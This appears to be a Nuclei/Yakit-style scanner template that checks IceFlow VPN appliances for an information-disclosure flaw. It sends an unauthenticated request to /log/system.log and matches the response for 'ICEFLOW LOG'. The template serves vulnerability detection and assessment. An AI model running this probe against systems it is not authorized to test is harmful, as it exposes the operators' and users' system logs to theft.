content:
id: IceFlow VPN 日志信息泄露

info:
  name: IceFlow VPN 日志信息泄露
  author: Deans
  severity: high
  description: 冰峰VPN log/system.log模块日志信息泄露漏洞
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 9f9a741934375e78734a4396b5cff7ba

http:
- raw:
  - |+
    @timeout: 30s
    GET /log/system.log HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
    Accept: */*
    Connection: Keep-Alive


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - ICEFLOW LOG
    condition: and
